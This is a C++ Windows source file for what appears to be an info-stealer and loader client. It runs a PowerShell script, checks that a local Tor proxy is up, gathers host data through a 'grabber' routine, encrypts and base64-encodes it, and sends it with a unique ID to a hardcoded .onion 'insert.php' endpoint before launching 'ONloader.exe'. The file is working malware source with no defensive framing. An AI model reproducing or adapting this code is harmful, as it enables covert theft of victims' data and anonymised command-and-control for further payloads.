#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <string> 
#include <fstream>
#include <TlHelp32.h> 
#include <wininet.h>
#include <sstream>
#include "grabber.h"
#include "network.h"
#include "cryptography.h"


#pragma comment(lib,"Wininet.lib")

using namespace std;

int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
//int main()
{
	char url[128];
	strcat(url,"http://127.0.0.1:9050");
	char verifyUrl[128];
	strcat(verifyUrl, "https://google.com");

	system("Powershell.exe -File start.ps1");
	
	int counter = 30;
	Sleep(1000);

	while (counter >=1)
	{
		Sleep(1000);
		bool internetCon = InternetCheckConnectionA(verifyUrl, FLAG_ICC_FORCE_CONNECTION, 0);
		bool proxyCon = InternetCheckConnectionA(url, FLAG_ICC_FORCE_CONNECTION, 0);

		if (proxyCon && internetCon)
		{
			cout << "proxy up!";
			ofstream ofs("start.txt");
			ofs << "start" << endl;
			ofs.close();
			ifstream ifs;
			ifs.open("start.txt");
			if (ifs)
			{
				string c = Grabber_Info();
			

				string unique_id = GenerateId(30);
			

				ofstream writeid;

				writeid.open("id.txt");
				writeid << unique_id;
				writeid.close();
			    
				string enc_info = encrypt_text(c);


				const auto text = EncodeBase64(enc_info);

	
				stringstream infos;

				infos << "http://s4m5vyfx72sjlsuzt72fabn3iv2igwovo3azn27im3xz3emt47gk6zad.onion/b/insert.php?uid=" << unique_id << "&info=" << text;

				string info = infos.str();
				//cout << info << endl;

				ReqToUrl(info);
				WinExec("ONloader.exe", 1);
				system("pause");
			}
			break;

		}
		else
		{
			cout << "proxy down or invalid internet connection";

		}
		counter--;
	}
	cout << "Invalid internet connection.FAIL!!!" << endl;
	
	getchar();
}
